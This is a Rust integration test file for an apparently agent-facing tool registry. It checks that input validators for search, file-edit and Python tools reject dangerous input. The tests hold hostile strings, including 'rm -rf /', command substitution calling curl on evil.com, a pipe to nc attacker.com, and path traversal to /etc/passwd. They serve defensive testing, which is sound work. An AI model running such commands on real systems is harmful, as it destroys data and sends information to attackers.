/// Integration tests for tools system
/// Tests the complete tool execution pipeline

#[cfg(test)]
mod tests {
    use yggdra::tools::{Tool, ToolRegistry, RipgrepTool, CommitTool, EditfileTool, PythonTool, SpawnTool, RusteTool};
    use std::fs;
    use tempfile::TempDir;
    use std::env;

    #[test]
    fn test_tool_registry_all_tools_present() {
        let registry = ToolRegistry::new();
        let tools = registry.list_tools();
        
        assert!(tools.contains(&"rg"), "rg tool not in registry");
        assert!(tools.contains(&"spawn"), "spawn tool not in registry");
        assert!(tools.contains(&"editfile"), "editfile tool not in registry");
        assert!(tools.contains(&"commit"), "commit tool not in registry");
        assert!(tools.contains(&"python"), "python tool not in registry");
        assert!(tools.contains(&"ruste"), "ruste tool not in registry");
    }

    #[test]
    fn test_ripgrep_blocks_dangerous_patterns() {
        let tool = RipgrepTool;
        
        // Should block command injection attempts
        assert!(tool.validate_input("test | other_command").is_err());
        assert!(tool.validate_input("test; rm -rf /").is_err());
        assert!(tool.validate_input("test && curl http://evil.com").is_err());
        assert!(tool.validate_input("test > /tmp/output").is_err());
        assert!(tool.validate_input("test `hostname`").is_err());
        
        // Valid patterns should pass (would fail on missing files, but validation should pass)
        assert!(tool.validate_input("test").is_ok());
        assert!(tool.validate_input("\"pattern\" \"/path\"").is_ok());
    }

    #[test]
    fn test_editfile_blocks_path_traversal() {
        let tool = EditfileTool;

        // Helper: build full args with null-sep format
        let args = |path: &str| format!("{}\x00old text\x00new text", path);

        // Should block path traversal
        assert!(tool.validate_input(&args("../../../etc/passwd")).is_err());
        assert!(tool.validate_input(&args("../../sensitive/file.txt")).is_err());

        // Should block system files
        assert!(tool.validate_input(&args("/etc/passwd")).is_err());
        assert!(tool.validate_input(&args("/bin/bash")).is_err());

        // Relative paths should be OK
        assert!(tool.validate_input(&args("myfile.txt")).is_ok());
        assert!(tool.validate_input(&args("./directory/file.txt")).is_ok());

        // Missing separator format should fail
        assert!(tool.validate_input("myfile.txt").is_err());
    }

    #[test]
    fn test_commit_tool_validation() {
        let tool = CommitTool;
        
        // Empty message should fail
        assert!(tool.validate_input("").is_err());
        
        // Non-empty message should pass validation
        assert!(tool.validate_input("fix: bug in parser").is_ok());
        assert!(tool.validate_input("docs: update readme").is_ok());
    }

    #[test]
    fn test_python_tool_blocks_network_imports() {
        let temp_dir = TempDir::new().expect("Failed to create temp dir");
        let script_path = temp_dir.path().join("test.py");

        // Create a script with dangerous imports
        let dangerous_script = r#"
import requests
print("This should be blocked")
"#;
        fs::write(&script_path, dangerous_script).expect("Failed to write test script");

        let tool = PythonTool;
        let path_str = script_path.to_string_lossy().to_string();
        
        // Should reject scripts with network imports
        assert!(tool.validate_input(&path_str).is_err(), "Should block requests import");

        // Create a safe script
        let safe_script = r#"
print("Hello, World!")
"#;
        fs::write(&script_path, safe_script).expect("Failed to write safe script");
        
        // Should accept safe scripts
        assert!(tool.validate_input(&path_str).is_ok(), "Should allow safe scripts");
    }

    #[test]
    fn test_tool_registry_dispatch() {
        let registry = ToolRegistry::new();
        
        // Dispatch to unknown tool should fail
        let result = registry.execute("nonexistent", "args");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("unknown tool"));
        
        // Dispatch with empty args to known tool should fail validation
        let result = registry.execute("rg", "");
        assert!(result.is_err(), "rg should reject empty args");
    }

    #[test]
    fn test_tool_network_escapes_blocked() {
        let registry = ToolRegistry::new();
        
        // Try to execute curl via rg - should be blocked
        let result = registry.execute("rg", "curl http://evil.com .");
        assert!(result.is_err(), "Should block curl attempt");
        
        // Try to execute wget via python - should be blocked by import scan
        let result = registry.execute("python", "/tmp/nonexistent_wget_script.py");
        assert!(result.is_err(), "Should reject nonexistent file");
    }

    #[test]
    fn test_tool_safety_chain() {
        let tool = RipgrepTool;
        
        // Test the full validation chain
        // 1. Empty input fails
        assert!(tool.validate_input("").is_err());
        
        // 2. Dangerous patterns fail
        assert!(tool.validate_input("$(curl http://evil.com)").is_err());
        
        // 3. Potential network escapes fail
        assert!(tool.validate_input("pattern | nc attacker.com 1234").is_err());
    }

    #[test]
    fn test_spawn_clock_exercise() {
        let tool = SpawnTool;
        
        // Test date command
        let result = tool.execute("date");
        assert!(result.is_ok(), "spawn date should succeed");
        let output = result.unwrap();
        assert!(!output.is_empty(), "date output should not be empty");
        // Output typically contains timestamp info
        assert!(output.len() > 10, "date output should be reasonable length");
        
        // Test uname command
        let result = tool.execute("uname -s");
        assert!(result.is_ok(), "spawn uname -s should succeed");
        let output = result.unwrap();
        assert!(!output.is_empty(), "uname output should not be empty");
    }

    #[test]
    fn test_spawn_arbitrary_commands() {
        let tool = SpawnTool;
        
        // Test ls command (should list current directory)
        let result = tool.execute("ls");
        assert!(result.is_ok(), "spawn ls should succeed");
        let output = result.unwrap();
        assert!(!output.is_empty(), "ls output should not be empty");
        
        // Test wc with echo piping (via separate commands)
        let result = tool.execute("pwd");
        assert!(result.is_ok(), "spawn pwd should succeed");
        let pwd_output = result.unwrap();
        assert!(pwd_output.contains("/"), "pwd output should contain path separator");
        
        // Test uname -a (multi-word command)
        let result = tool.execute("uname -a");
        assert!(result.is_ok(), "spawn uname -a should succeed");
        let output = result.unwrap();
        assert!(!output.is_empty(), "uname -a output should not be empty");
    }

    #[test]
    fn test_ruste_clock_exercise() {
        let tool = RusteTool;
        let temp_dir = TempDir::new().expect("Failed to create temp dir");
        let script_path = temp_dir.path().join("clock_exercise.rs");

        // Write a simple Rust program that outputs the current time
        let rust_code = r#"
fn main() {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();
    let h = (secs % 86400) / 3600;
    let m = (secs % 3600) / 60;
    let s = secs % 60;
    println!("UTC {:02}:{:02}:{:02}", h, m, s);
    println!("Program executed successfully!");
}
"#;
        fs::write(&script_path, rust_code).expect("Failed to write rust script");

        let path_str = script_path.to_string_lossy().to_string();
        
        // Execute the ruste tool
        let result = tool.execute(&path_str);
        assert!(result.is_ok(), "ruste should compile and execute the program: {:?}", result);
        
        let output = result.unwrap();
        assert!(!output.is_empty(), "Program output should not be empty");
        assert!(output.contains("UTC"), "Output should contain 'UTC' timestamp");
        assert!(output.contains("successfully"), "Output should confirm success");
    }
}
